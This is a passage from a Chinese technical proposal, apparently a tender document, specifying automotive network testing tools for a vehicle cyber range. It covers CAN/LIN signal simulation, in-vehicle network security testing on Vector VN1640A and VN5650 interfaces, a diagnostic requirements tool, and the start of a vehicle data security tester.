title="软件方案"></a>软件方案</h5><p>导入通信矩阵：</p><p>设计一个功能，允许用户导入通信矩阵文件，以定义车辆信号的消息和信号信息。</p><p>支持常见的通信矩阵文件格式，如DBC（CAN）、LDF（LIN）等。</p><p>信号模拟：</p><p>实现车门、车窗、点火信号、钥匙、车速、发动机转速、电量、档位、后备箱、引擎盖等信号的模拟。</p><p>提供用户界面，允许用户选择要模拟的信号，并设置其相应的值和状态。</p><p>总线协议支持：</p><p>支持CAN、CANFD和LIN总线协议，以满足不同车辆的通信需求。</p><p>实现对这些总线协议的解析和生成，以便与车辆通信。</p><p>CANOE工具链支持：</p><p>集成CANOE工具链，以便与CANOE进行通信和协同工作。</p><p>通过CANOE提供的API，实现与CANOE的连接和数据交换。</p><p>收发报文实时打印：</p><p>在软件界面上显示实时收发的报文，以便用户实时监视通信状态。</p><p>报文显示包括报文ID、数据和时间戳等信息。</p><p>收发报文日志记录与保存：</p><p>记录和保存收发的报文日志，用于后续分析和审查。</p><p>可以将报文日志保存为文件，支持常见的日志文件格式，如CSV、TXT等。</p><p>此外，还可以考虑以下功能来增强软件的实用性和易用性：</p><p>用户界面设计：设计直观友好的用户界面，使用户能够轻松配置和控制信号模拟。</p><p>信号模拟方案管理：支持保存和加载不同的信号模拟方案，以便用户可以快速切换和重用配置。</p><p>信号触发和事件：支持基于条件的信号触发和事件，使用户能够模拟特定情况下的信号变化。</p><p>脚本支持：提供脚本功能，允许用户编写自定义脚本来控制信号模拟和处理收发报文。</p><p>错误处理和日志记录：实现错误处理机制，记录错误日志，并向用户提供相应的错误提示和解决方案。</p><h5 id="工具功能-7"><a href="#工具功能-7" class="headerlink" title="工具功能"></a>工具功能</h5><p>通信矩阵导入：支持导入通信矩阵，这是定义车辆内部通信网络中消息和信号的关键文档。</p><p>车辆信号模拟：能够模拟车门、车窗、点火信号、钥匙、车速、发动机转速、电量、档位、后备箱、引擎盖等车辆信号，以测试车辆的反应和系统的稳定性。</p><p>总线协议支持：支持CAN (Controller Area Network)、CAN FD (Flexible Data-Rate) 和LIN (Local Interconnect Network) 总线协议，覆盖了大多数现代车辆使用的通信协议。</p><p>CANoe工具链支持：兼容并支持Vector的CANoe工具链，这是汽车通信分析和测试中常用的工具。</p><p>实时报文打印：支持收发报文的实时打印，使测试人员能够即时观察通信数据。</p><p>报文日志记录与保存：支持收发报文的日志记录与保存，便于后续分析和问题追踪。</p><h3 id="车载网络安全测试工具"><a href="#车载网络安全测试工具" class="headerlink" title="车载网络安全测试工具"></a>车载网络安全测试工具</h3><h4 id="工具概述-8"><a href="#工具概述-8" class="headerlink" title="工具概述"></a>工具概述</h4><p>车载网网络安全测试工具主要针对车载内部网络进行信息安全测试，包括CAN总线、车载以太网等，其中CAN总线部分测试可满足doip 、someip等协议的测试。</p><h4 id="功能实施方案-53"><a href="#功能实施方案-53" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>软件功能实施方案</li><li>支持的协议包括CAN（控制器局域网络）和ETH（以太网），满足了现代汽车通信网络的多样化需求；</li><li>内置了多样化的通信数据库编辑器，为用户提供了灵活的数据定义与编辑工具。以CANdb++为例，它是专门设计用于编辑DBC文件的，这种文件格式在CAN网络通信中至关重要，用于明确定义消息、信号以及网络节点等信息。用户可以借助CANdb++轻松创建和修改DBC文件，确保车辆网络中的数据通信准确无误。另一个工具是Communication Model Editor，它专注于SOA（面向服务的架构）数据模型的编辑，这在车载系统的服务组织和交互设计中非常重要。这个编辑器使得用户能够设计服务接口、管理事件和调整服务间的交互关系；</li><li>支持通过建模进行完整的总线系统仿真和残余总线仿真。总线系统仿真功能它使得工程师能够在没有实际车辆或物理组件的情况下，通过软件模型来模拟整个车辆的通信网络。这种仿真包括所有相关的网络节点、传输的消息和信号，允许用户进行全面的系统测试，包括安全性验证、性能评估和故障模拟。而残余总线仿真则专注于在部分物理网络存在的情况下，模拟剩余未连接部分的网络节点。这对于测试和验证单个组件或模块在整个系统中的行为至关重要，有助于在不干扰现有网络的前提下，确保新组件的兼容性和性能；</li><li>支持分析总线通信功能，允许用户监测、记录并分析车辆网络上的数据流。通过这一功能，用户可以检测通信异常、性能问题和安全漏洞；</li><li>支持测试完整的车辆网络系统以及单个的控制单元，确保系统集成的完整性和单个单元的功能正确性；</li><li>通过统一诊断服务（UDS）协议，提供了一套全面的诊断通信测试功能。这允许工程师对车辆的各种控制单元进行诊断，以验证和确保它们的通信符合预期的标准和性能。利用这些测试，可以检测和诊断故障码，执行服务和编程任务，以及进行实时数据监控和操作；</li><li>提供了强大的用户自定义界面创建功能，使得用户能够根据特定需求设计和定制控制面板。这样，用户不仅可以更直观地操控仿真和测试流程，还能按照个人的偏好和要求展示分析结果和数据；</li><li>向用户提供了一系列窗口和模块，便于用户访问各种工具和功能，从而实现高效的操作和管理；</li><li>支持图形显示和功能模块，可将复杂数据和测试结果进行可视化展示，使用户能够直观理解信息。此外，它还提供了评估功能，允许用户通过参数化设置对测量进行详细的自定义配置。这些设置旨在提高用户对测试过程的控制能力，确保可以根据具体的测试需求调整和优化测量参数，从而获得精确的评估结果；</li><li>支持详尽地列出在车辆网络总线上发生的所有活动，包括每一条报文、错误帧和远程帧等。还具有强大的数据展示能力，允许用户对每条捕获的报文进行深入分析，直至信号层面。每个信号都可以单独显示，使得用户能够获得每个细节信息。此外，还提供了一个灵活的过滤系统，用户可以根据需要筛选出关键信息，以便集中分析特定的报文或事件。除了报文信息，还能够展示各种事件，包括错误事件、系统变量、传输协议的详细信息以及诊断服务的相关数据。</li><li>支持提供一种图形化的方式来展示信号、变量和诊断参数，这些数据可以在XY图上清晰地显示出来。这一功能对于那些需要测量和观察随时间变化的曲线非常有用，例如分析速度和温度等参数如何随时间而变化。用户可以利用这个功能来绘制出数据点，形成直观的图形，从而更容易地识别出趋势、模式和潜在的问题。</li><li>支持展示信号值的能力，不仅能以数字的形式直观地呈现出来，还能通过柱状图的方式进行视觉展示。这种双重显示方法使得用户可以从不同的角度理解信号数据，数字形式提供精确值，而柱状图则便于比较和视觉分析；</li><li>支持实时监控并显示关键的网络通信参数，涵盖了报文的传输频率、网络中检测到的错误帧数量、总线的实时负载水平，以及连接在网络上的各个控制器的当前状态；</li><li>支持报文触发功能，允许用户根据预设的条件进行自动化处理，这包括在检测到特定事件或达到某些参数阈值时，系统能够即刻响应并实时地发送出修正信号；</li><li>支持记录功能，可以详细记录网络通信数据，为后期的深入分析提供丰富的数据支持。用户能够利用这些记录，执行详尽的数据回放，以复现实时通信中发生的事件；</li><li>支持对总线事件的具体响应，能够大幅减少无关紧要的数据显示和记录，使得用户可以专注于分析那些对系统性能和安全性至关重要的数据。这不仅提高了数据管理的效率，也优化了资源使用；</li><li>支持显示标准的系统报文，还能够让用户根据需要自定义输出。用户可以根据特定的测试需求配置显示界面，以便展示对于调试和分析至关重要的信息。这包括但不限于实时数据流、统计图表、特定报文的详细内容、以及自定义的数据集。</li><li>CAN总线模块功能实施</li></ol><p>产品信息如下：</p><p>品牌：vector</p><p>型号：VN1640A</p><p>数量：3套</p><p>指标参数信息如下：</p><ol><li>支持配置CAN和CAN-FD网络的波特率及采样点，使得工程师能够根据不同的车辆网络需求和性能标准调整通信速率。波特率决定了数据的传输速度，而采样点则指定了在数据位的传输周期内读取数据的精确时刻。通过精确配置这些参数，可以优化网络的通信效率，增强数据传输的可靠性和稳定性；</li><li>具备接收和发送CAN/CAN-FD总线数据的能力，能够监控和分析车辆网络中的通信情况。用户可以利用这个功能来捕获总线上的实时数据，进行故障诊断，或者模拟节点向网络发送数据，以测试网络的响应和系统的健壮性；</li><li>支持VN1640A单台具备4路CAN/CANFD通道，提供3套即3*4路共12路的高速CAN/CAN FD通道，充分满足了多通道数据处理的需求。对于CAN通道，模块能够支持多种波特率设置，包括125kbps、250kbps、500kbps以及1Mbps，确保了与各种不同速率要求的车载网络的兼容性。而对于CAN FD通道，模块同样支持多样的波特率选择，用户可以根据需要选择2Mbps、5Mbps或是8Mbps的传输速率。这种灵活的波特率配置能力，使得该模块能够适应从传统车载网络到最新高速网络的各种应用场景，无论是在车辆监控、数据采集还是网络测试中，都能提供稳定可靠的数据传输性能；</li><li>支持高精度的时间戳记录功能，能够为发送和接收的CAN/CAN-FD信号精确打上时间戳，时间戳的精确记录对于识别和解决网络中的同步问题、性能瓶颈以及优化数据流至关重要。此外，时间戳也为后期的数据分析提供了关键信息，极大地提升了测试管理平台的诊断能力和数据分析的准确性；</li><li>具备监测能力，不仅能够识别和记录常规的数据帧，还能够检测到网络上的错误帧和远程帧；</li><li>所有CAN和CAN-FD通道都被精心调校，以确保它们能够在完全的总线负载下仍然保持正常运行，以满足100%总线负载。这意味着即使在负载达到100%时，每个通道也能够无差错地处理满载的数据流，确保数据的连续性和完整性不受影响；</li><li>配备了硬件同步接口，其同步精度达到1μs，这允许平台与其他总线接口卡协同工作。这种高级别的同步精度对于实现精确的时间对准和数据一致性至关重要，特别是在进行多通道和多种总线技术（如CAN, CAN-FD等）的综合测试时。通过这种同步，平台能够确保来自不同接口卡的数据能被准确地时间标记和协调，从而提供高度一致和可靠的测试结果；</li><li>支持与各种网络测试工具软件的集成。这些工具软件可以进行多种测试，例如网络负载测试、错误注入和测试等；</li><li>车载以太网模块功能实施方案</li></ol><p>产品信息如下：</p><p>品牌：vector</p><p>型号：VN5650</p><p>数量：20套</p><p>指标参数信息如下：</p><ol><li>VN5650具备12通道的标准100BASE-T1/1000BASE-T1（OPEN Alliance BroadR-Reach）接口，提供20套VN5650，即20*12共计240通道的100BASE-T1/1000BASE-T1（OPENAllianceBroadR-Reach）接口，这一特性使得模块能够处理大量的数据传输，同时保持与OPEN Alliance BroadR-Reach技术的完全兼容性；</li><li>提供的VN5650具备2通道的标准10BASE-T、100BASE-TX和1000BASE-T接口，提供20套VN5650，即20*2共计40通道的标准以太网连接，包括10BASE-T、100BASE-TX和1000BASE-T规格。这种强大的多通道支持使得模块能够适应各种数据密集型应用，从基本的车辆诊断到高端的多媒体传输；</li><li>提供的VN5650具备2通道的CAN/CAN FD通道，共提供20套VN5650，即20*2共40个独立的CAN/CAN FD通道，这些通道通过1个标准的D-SUB 9接口提供连接。这一设计使得模块能够同时处理多个CAN或CAN FD总线上的数据交换，满足复杂车辆系统中对于多通道、高效率通信的需求。每个通道都能独立运作，确保了数据传输的准确性和系统的可靠性；</li><li>支持IO接口的功能，这些接口可被用来配置或采集模拟信号和数字信号的值。通过这些IO接口，用户可以进行输入输出操作，例如设置电压或电流水平，以及读取传感器数据或控制执行器等；</li><li>通过USB 3.0接口连接至主机计算机，提供了快速的数据传输速率，确保了与主机之间的高速通信；</li><li>具备为以太网帧提供高分辨率时间戳的能力，对于精确追踪网络事件和数据包传输时间至关重要，它支持详尽的网络性能分析和故障排查工作；</li><li>能够为CAN和CANFD帧提供高分辨率时间戳记录功能，能够精确到微秒级别，这对于确保数据传输的时间精度和系统诊断是极其关键的。高分辨率时间戳对于分析通信延迟、网络管理和故障检测在内的应用场景都是不可或缺的；</li><li>支持多个网络接口的软件和硬件时间同步，以保证所有通道的时间戳保持一致，数据帧在不同网络接口间的时间戳能够精确对齐，从而支持复杂的数据分析和故障排查任务；</li><li>具备内部三向路由，三项路由通常指的是网络设备（如路由器、交换机或网络中继设备）中内部的路由机制，能够处理进入（in）、监控（monitor）和输出（out）的数据流，在进行网络通信处理时，可适配多种利用场景；</li><li>支持以太网和CAN数据的硬件过滤，该过滤方式是一种高效的数据处理机制，它在物理层面上筛选通过网络的数据包。这种过滤机制直接在硬件中实现，能够在数据包进入软件堆栈之前，根据预设的规则（如特定的帧ID或数据内容）拦截和处理特定的数据帧，从而减轻主处理器的负担，提高系统的整体性能和响应速度。</li><li>集成的Layer2交换机是一个先进的网络组件，它在多通道网络环境中发挥着至关重要的作用，特别是在执行残余总线仿真时。这种交换机能够智能地管理和优化数据流，确保数据包在不同的通道之间高效地传输。在复杂的车载网络系统中，这意味着可以模拟网络上不存在的节点，从而确保即使在某些节点未在线或发生故障时，网络通信也能够无缝进行。通过这种方式，Layer2交换机提升了测试平台的灵活性和仿真能力，使其能够更加精确地模拟和测试车辆内部通信系统的行为和性能；</li><li>用于低抖动和全带宽的硬件负载发生器，是一种专为生成稳定通信流量而设计的设备，其目的是在网络上产生接近实际条件下的数据流，以测试系统的性能。这种设备能够在保持低延迟波动的同时，充分利用网络的全部传输能力，从而确保测试结果的准确性和可靠性。</li><li>独立模式功能允许设备在没有外部控制的情况下持续运行，确保了连续不断的操作，这对于需要长时间稳定运作的场合尤为关键，提高了系统的可靠性和自主性；</li><li>该设备的设计考虑了汽车和工业应用的严苛环境，确保了在广泛的电源电压和温度条件下都能保持稳定运行，从而适应了这些行业对稳定性、供电适应性和温度耐受性的高要求。</li><li>兼容第三方工具开发接口，支持使用XL驱动程序库进行CAN和以太网通信。这种兼容性允许开发者和工程师使用广泛的行业标准工具和库来扩展功能，实现更灵活的集成和定制，从而增强了平台的通用性和适应性，满足不同用户的需求。</li><li>支持与各种网络测试工具软件的集成。这些工具软件可以进行多种测试，例如网络负载测试、错误注入和测试等。</li></ol><h4 id="技术实现内容-46"><a href="#技术实现内容-46" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="硬件方案-7"><a href="#硬件方案-7" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>整体架构：</p><p>主控单元：使用高性能的嵌入式处理器，具备足够的计算能力和存储容量来支持测试工具的功能。</p><p>CAN总线模块：满足CAN总线模块参数要求的功能参数，包括支持多路CAN和CANFD、配置波特率和采样点、数据接收和发送功能、时间戳记录等。</p><p>以太网模块：满足车载以太网模块参数要求的功能参数，包括支持多通道的100BASE-T1/1000BASE-T1和标准以太网、独立的CAN/CANFD通道、IO接口、高分辨率时间戳等。</p><p>硬件设计要点：</p><p>主控单元：选择高性能的嵌入式处理器，具备足够的计算能力和存储容量，以支持测试工具的复杂功能和数据处理要求。</p><p>CAN总线模块：选择能够满足CAN总线模块参数要求的模块，包括支持多路CAN和CANFD、配置波特率和采样点、数据接收和发送功能、时间戳记录等功能。</p><p>以太网模块：选择能够满足车载以太网模块参数要求的模块，包括支持多通道的100BASE-T1/1000BASE-T1和标准以太网、独立的CAN/CANFD通道、IO接口、高分辨率时间戳等功能。</p><p>数据采集和处理：使用适当的模数转换器（ADC）和数字信号处理器（DSP）来实现数据的采集和处理，以支持图形显示、参数化测量设置、信号值显示等功能。</p><p>外部接口：提供适当的接口，如USB3.0接口用于与主机连接，1xD-SUB9接口用于CAN/CANFD通道的连接，以及其他必要的接口用于与外部设备的连接。</p><p>稳定性和耐用性：确保硬件设计具备稳定性、耐用性和适应汽车和工业环境的特点，包括供电和温度范围的要求。</p><h5 id="软件方案-8"><a href="#软件方案-8" class="headerlink" title="软件方案"></a>软件方案</h5><p>软件架构：</p><p>前端界面：设计用户友好的图形用户界面（GUI），提供用户操作和控制工具的界面。</p><p>后端处理：实现测试工具的核心功能，包括CAN/ETH通信、通信数据库编辑器、总线系统仿真、分析总线通信、测试网络和单个控制单元、UDS协议诊断通信测试等。</p><p>功能模块：</p><p>CAN/ETH通信模块：实现CAN和以太网通信功能，包括数据收发、波特率配置、采样点设置等。</p><p>通信数据库编辑器模块：提供多种通信数据库编辑器，如CANdb++和Communication Model Editor，支持DBC数据编辑库和SOA数据模型编辑。</p><p>总线系统仿真模块：通过建模实现完整的总线系统仿真和残余总线仿真，模拟车辆网络环境。</p><p>分析总线通信模块：对总线通信进行分析，包括报文解析、信号提取、错误帧检测等功能。</p><p>测试网络和单个控制单元模块：测试整个网络和单个控制单元的功能和性能，包括发送测试报文、接收和验证报文、性能指标测量等。</p><p>UDS协议诊断通信测试模块：通过UDS协议进行诊断通信测试，包括发送诊断请求、接收和解析诊断响应、执行诊断服务等。</p><p>用户自定义界面模块：提供用户自定义界面的功能，允许用户根据需要自定义界面布局和控制元素。</p><p>数据显示和记录模块：实现信号、变量和诊断参数的图形显示，支持XY图、数字形式和柱状图形式的显示，同时支持报文频率、错误帧、总线负载和控制器状态的显示和记录。</p><p>窗口和模块模块：提供给用户各种窗口和模块，如事件显示项、系统变量、传输协议信息和诊断服务等。</p><p>参数化测量设置模块：支持图形显示和功能模块以及评估功能的参数化测量设置，如速度和温度与时间的关系的测量和观察曲线。</p><p>软件开发：</p><p>选择合适的编程语言和开发框架，如C++、Python或Java，并结合相关的开发工具和库来实现软件功能。</p><p>遵循模块化设计原则，将不同功能模块拆分成独立的组件，实现高内聚低耦合的设计。</p><p>使用合适的设计模式和架构模式，如MVC（Model-View-Controller）模式，来实现良好的软件结构和可扩展性。</p><p>进行充分的测试和调试，确保软件的稳定性和功能的正确性。</p><p>提供适当的文档和用户手册，以便用户了解和使用测试工具。</p><h5 id="工具功能-8"><a href="#工具功能-8" class="headerlink" title="工具功能"></a>工具功能</h5><ol><li>软件功能</li></ol><p>License提供：提供3套永久使用的license，支持CAN (Controller Area Network) 和ETH (Ethernet)。</p><p>通信数据库编辑器：自带多种通信数据库编辑器，如CANdb++支持DBC数据编辑库，Communication Model Editor支持SOA（Service-Oriented Architecture）数据模型编辑。</p><p>总线系统仿真：通过建模进行完整的总线系统仿真和残余总线仿真，模拟网络中未连接的节点。</p><p>总线通信分析：支持分析总线通信，以识别和解决通信问题。</p><p>网络和单元测试：测试完整网络和单个控制单元，确保系统的整体和局部功能。</p><p>UDS诊断通信测试：通过统一诊断服务（Unified Diagnostic Services）协议进行诊断通信测试。</p><p>用户自定义界面：可以创建用户自定义界面来控制仿真和测试过程或显示分析数据。</p><p>多窗口和模块：提供给用户多种窗口和模块，以便于操作和数据展示。</p><p>图形显示和参数化测量：支持图形显示和功能模块以及评估功能的参数化测量设置。</p><p>总线活动监控：列出所有的总线活动项，如报文、错误帧和远程帧，并支持过滤功能。</p><p>图形化数据展示：支持信号、变量和诊断参数以图形方式显示在XY图中，用于测量和观察曲线。</p><p>信号值显示：支持以数字形式和柱状图形式显示信号值。</p><p>网络状态监控：显示报文频率、错误帧、总线负载和控制器状态。</p><p>报文触发：支持报文触发，实时发送修正信号。</p><p>数据记录与回放：支持记录，后期分析和数据回放功能。</p><p>总线事件响应：支持对总线事件的具体响应，优化显示和记录的数据量。</p><p>报文显示：支持显示系统报文和用户自定义的输出。</p><ol><li>CAN总线模块功能</li></ol><p>波特率与采样点配置：支持配置CAN和CAN-FD的波特率及采样点，以适应不同的通信需求。</p><p>数据收发功能：具备CAN和CANFD总线数据接收和发送的功能，确保数据流的正常传输。</p><p>多路CAN/CANFD支持：支持多路CAN及CANFD，提供高速CAN通道12路，CANFD通道12路；CAN支持波特率125kbps、250kbps、500kbps、1Mbps，CAN-FD支持波特率2Mbps、5Mbps、8Mbps。</p><p>时间戳记录：对发送和接收的信号进行时间戳记录，以便于事件追踪和性能分析。</p><p>错误帧和远程帧监测：可监测错误帧和远程帧，以识别和解决网络问题。</p><p>高总线负载适应性：确保所有CAN/CANFD通道可以满足100%的总线负载，保障高负载情况下的稳定性。</p><p>硬件同步接口：具备硬件同步接口，同步精度达到1微秒，可与其他总线接口卡联合使用，实现多系统同步测试。</p><p>网络测试工具软件支持：支持网络测试工具软件，提供用户友好的界面和功能强大的测试选项。</p><ol><li>车载以太网模块功能</li></ol><p>100BASE-T1/1000BASE-T1支持：支持26通道的100BASE-T1/1000BASE-T1（OPENAlliance BroadR-Reach），适用于高速汽车网络应用。</p><p>标准以太网通道：支持40通道的标准以太网（10BASE-T/100BASE-TX/1000BASE-T），确保与现有网络设备的兼容性。</p><p>多通道CAN/CANFD：支持10个独立的CAN/CANFD通道，通过1xD-SUB9连接，满足复杂车载网络测试需求。</p><p>IO接口：支持IO接口，用于设置或采样模拟/数字值，增加测试工具的灵活性。</p><p>USB3.0连接：通过USB3.0连接主机，保证与主机之间的高速数据传输。</p><p>高分辨率时间戳（以太网帧）：为以太网帧提供高分辨率时间戳，以便精确的时间分析和调试。</p><p>高分辨率时间戳（CAN/CANFD帧）：为CAN/CANFD帧提供高分辨率时间戳，确保通信事件的精确时间记录。</p><p>时间同步：多个网络接口的软件和硬件时间同步，确保在多网络环境中的一致性和同步性。</p><p>内部三向路由：内部三向路由功能（in/monitor/out）提供灵活的数据流控制。</p><p>硬件过滤：以太网和CAN数据的硬件过滤，减少不必要的数据传输和处理。</p><p>集成Layer2交换机：集成的Layer2交换机，用于优化多个通道的残余总线仿真，提高效率。</p><p>硬件负载发生器：具有用于低抖动和全带宽的硬件负载发生器，用于测试系统的负载处理能力。</p><p>独立模式运行：独立模式功能，确保工具可以不依赖主机独立运行。</p><p>适用性：适用于汽车和工业应用的稳定性，具备适当的供电和温度范围。</p><p>第三方工具接口：提供对第三方工具的开放接口，可使用XL驱动程序库（CAN和以太网）进行扩展。</p><p>网络测试工具软件支持：支持网络测试工具软件，为用户提供了一个易于操作的界面和强大的网络测试功能。</p><h3 id="诊断需求定义工具"><a href="#诊断需求定义工具" class="headerlink" title="诊断需求定义工具"></a>诊断需求定义工具</h3><h4 id="工具概述-9"><a href="#工具概述-9" class="headerlink" title="工具概述"></a>工具概述</h4><p>这个诊断需求定义工具是一个功能强大的软件工具，旨在帮助汽车行业进行诊断需求的定义和管理。它支持导入和导出各种数据格式，如ODX、CSV、RTF、A2L、XML、CDI，使用户能够方便地处理和转换不同格式的数据。</p><p>该工具具备多项重要功能，包括对ODX文件的处理和导出，支持ODX 2.0.1和2.2.0版本文件的导入和导出，以及生成符合AUTOSAR 4.2.2/4.3.0标准的诊断提取（DEXT文件）。它还支持AUTOSAR系统描述的导入，简化了信号和转换的定义过程。</p><p>此外，该工具还支持UDS和DoIP协议，使用户能够进行诊断通信测试和分析。它提供了便捷的DTC故障代码的导入和导出功能，可以在不同文件之间进行转换和管理。同时，它还提供了ODX文件的阅读工具，帮助用户更好地理解和分析ODX文件的内容。</p><h4 id="功能实施方案-54"><a href="#功能实施方案-54" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>产品信息如下：</p><p>品牌：国利</p><p>型号：GLUDS</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>具备高度的数据兼容性，能够支持导入和导出多种不同的数据格式，包括但不限于ODX（Open Diagnostic data eXchange），CSV（Comma-Separated Values），RTF（Rich Text Format），A2L（ASAM MCD-2 MC），XML（eXtensible Markup Language），以及CDI（CANdelaStudio Diagnostic Information）。这样的设计使得用户能够轻松地与其他系统交换数据，确保了在不同应用和工具之间的无缝数据集成和流畅的工作流程；</li><li>能够适应多版本的ODX文件标准。它不仅支持导入ODX 2.0.1和2.2.0版本的文件，确保与现有诊断工具和流程的兼容性，还能够导出ODX 2.0.1、2.1.0以及2.2.0版本的文件，提供了灵活的数据交互选项；</li><li>支持AUTOSAR标准，提供了一种简便的方法，允许用户直接从AUTOSAR系统描述中导入所需的信号。这一过程不仅提高了工作效率，还降低了复杂性。此外，它还具备将这些信号进行必要转换的功能，以生成符合AUTOSAR规范的诊断提取文件，也就是DEXT文件。</li><li>支持导出的文件严格遵循AUTOSAR 4.2.2和4.3.0规范中所定义的“诊断提取模板”标准，它们将无缝对接并满足那些基于最新AUTOSAR规范的系统的要求。</li><li>具备对统一诊断服务（UDS）以及诊断协议（DoIP）的支持，允许用户利用这些先进的车载通讯协议进行高效的诊断操作，从而加强了与现代汽车网络的兼容性和互操作性；</li><li>支持从各种文件格式中导入或导出诊断故障代码（DTC），使得用户能够轻松地处理和转换故障代码信息，以适应不同的工作流程和系统需求；</li><li>支持ODX文件阅读工具，使得用户能够方便地查看和分析ODX格式的诊断数据文件内容；</li><li>支持用户将诊断规范以富文本格式（RTF）或超文本标记语言（HTML）导出，这样便于在不同的环境和应用中查看和分享这些规范文档；</li></ol><h4 id="技术实现内容-47"><a href="#技术实现内容-47" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="软件方案-9"><a href="#软件方案-9" class="headerlink" title="软件方案"></a>软件方案</h5><p>软件架构：</p><p>前端界面：设计用户友好的图形用户界面（GUI），提供用户操作和控制工具的界面。</p><p>后端处理：实现工具的核心功能，包括数据导入和导出、ODX文件处理、AUTOSAR支持、诊断规范导出等。</p><p>功能模块：</p><p>数据导入和导出模块：支持导入和导出各种数据格式，如ODX、CSV、RTF、A2L、XML、CDI等，提供灵活的数据转换和兼容性。</p><p>ODX文件处理模块：支持ODX 2.0.1和2.2.0版本文件的导入，并可导出ODX 2.0.1、2.1.0和2.2.0版本文件，实现对ODX文件的读取和生成。</p><p>AUTOSAR支持模块：支持从AUTOSAR系统描述简单导入信号和转换，用于生成符合AUTOSAR 4.2.2/4.3.0标准的诊断提取（DEXT文件）的导出功能。</p><p>UDS和DoIP支持模块：支持UDS和DoIP协议，实现与诊断通信相关的功能，如发送诊断请求、接收和解析诊断响应等。</p><p>DTC故障代码导入和导出模块：支持在不同文件中导入或导出DTC故障代码，实现对故障代码的管理和转换。</p><p>ODX文件阅读工具模块：提供ODX文件的阅读工具，用于查看和分析ODX文件的内容和结构。</p><p>诊断规范导出模块：支持将诊断规范导出为RTF和HTML格式，满足诊断需求文档的输出要求。</p><p>软件开发：</p><p>选择合适的编程语言和开发框架，如C++、Python或Java，并结合相关的开发工具和库来实现软件功能。</p><p>遵循模块化设计原则，将不同功能模块拆分成独立的组件，实现高内聚低耦合的设计。</p><p>使用合适的设计模式和架构模式，如MVC（Model-View-Controller）模式，来实现良好的软件结构和可扩展性。</p><p>进行充分的测试和调试，确保软件的稳定性和功能的正确性。</p><p>提供适当的文档和用户手册，以便用户了解和使用工具。</p><h5 id="工具功能-9"><a href="#工具功能-9" class="headerlink" title="工具功能"></a>工具功能</h5><p>多种数据格式支持：工具支持导入和导出多种数据格式，包括ODX、CSV、RTF、A2L、XML、CDI，增加了与其他工具和系统的兼容性。</p><p>ODX文件版本兼容性：支持ODX 2.0.1, 2.2.0版本文件的导入，并能够导出ODX 2.0.1, 2.1.0, 2.2.0版本文件，确保了与不同版本ODX文件的兼容。</p><p>AUTOSAR支持：支持从AUTOSAR系统描述中简单导入信号，并具备生成AUTOSAR诊断提取（DEXT文件）的导出功能，方便AUTOSAR系统的诊断工作。</p><p>AUTOSAR诊断提取模板标准：支持导出的文件符合AUTOSAR 4.2.2/4.3.0的“诊断提取模板”标准，保持与AUTOSAR标准的一致性。</p><p>UDS和DoIP协议支持：支持统一诊断服务（UDS）和诊断协议（DoIP），这是现代汽车诊断中常用的协议。</p><p>DTC故障代码处理：可以在不同文件中导入或导出诊断故障代码（DTC），方便故障诊断和管理。</p><p>ODX文件阅读工具：支持ODX文件阅读工具，使用户能够方便地查看和管理ODX文件内容。</p><p>诊断规范导出：支持将诊断规范导出为RTF、HTML等格式，便于文档的创建和分发。</p><p>软件使用许可：提供软件永久使用license，确保用户可以长期使用该工具而无需担心许可到期的问题。</p><h1 id="智能汽车网络靶场工具库-数据安全测试工具"><a href="#智能汽车网络靶场工具库-数据安全测试工具" class="headerlink" title="智能汽车网络靶场工具库-数据安全测试工具"></a>智能汽车网络靶场工具库-数据安全测试工具</h1><h2 id="技术路线-7"><a href="#技术路线-7" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="车端数据安全测试工具"><a href="#车端数据安全测试工具" class="headerlink" title="车端数据安全测试工具"></a>车端数据安全测试工具</h3><p>车端数据安全工具以用于测试整车、车载终端和联网汽车业务系统数据的全生命周期的数据安全检测，支持整车数据跨境传输的安全测试。</p><h4 id="功能实施方案-55"><a href="#功能实施方案-55" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>品牌：国利</p><p>型号：GLCARdm</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>本款车端数据安全工具采用的机箱设计遵循了标准上架式机箱的规格，它可以方便地安装在标准的服务器机架中，与其他网络设备一起统一管理和维护。这种机箱不仅结构坚固，保护内部元件免受物理损害，同时也具备良好的散热性能，确保设备在连续运行时能够维持适宜的工作温度。此外，标准化的设计也方便了设备的扩展和升级，使得未来的维护和升级变得更加简便快捷。</li><li>车端数据安全工具的设计中包含了一路开/关机按钮，这提供了一种直观且便捷的方式来控制设备的电源状态。用户可以通过简单地按下这个按钮来启动或关闭设备，无需通过复杂的软件界面或命令行指令。这种物理开关按钮设计不仅提高了操作的便利性，同时也为紧急情况下快速切断电源提供了可能，增加了设备使用的安全性。此外，这个按钮通常带有明显的标识，易于用户识别和使用，即使在光线较暗或视线受限的环境中也能轻松操作。</li><li>车端数据安全工具核心采用了性能强劲的处理器，具体型号为Intel I7，其主频达到1.8GHz。这款处理器以其高效的计算能力和稳定的性能在业界享有盛誉，能够确保数据安全工具在处理大量车载数据时不会出现瓶颈。无论是进行复杂的数据加密解密任务，还是执行高速数据传输过程中的安全认证，这款处理器都能提供充足的计算资源以支持高性能的操作需求。此外，1.8GHz的主频也意味着在节能和散热方面有着不错的表现，这对于车载环境中的电子设备来说尤为重要。</li><li>车端数据安全工具配备了8GB的内存容量，这样的配置为该工具提供了充裕的数据缓存空间，确保在执行密集型的数据处理任务时，如实时监控、数据分析和加密处理等，系统能够流畅运行，不会因内存不足导致的延迟或性能下降。8GB内存使得工具能够高效地处理并存储大量临时数据，同时也支持多任务并发执行，提升了数据处理的效率和响应速度。这一内存规格在车载系统中属于较高配置，能够满足未来数据处理需求的潜在增长，为车端数据安全提供了一个强有力的硬件保障。</li><li>车端数据安全工具采用了SSD固态硬盘作为其存储解决方案，具备256GB的存储容量。这种SSD固态硬盘相较于传统机械硬盘，在读写速度、耐用性和抗震动方面有着显著优势，极大提升了车载系统的数据处理效率和可靠性。256GB的容量确保了足够的空间来存储操作系统、应用程序以及大量的车辆数据，包括但不限于实时交通信息、导航数据、日志文件等。此外，SSD的快速读写能力对于提高车端数据安全工具的反应速度和稳定性至关重要，这对于要求高速数据处理和立即响应的车载环境来说，是一项不可或缺的技术规格。</li><li>车端数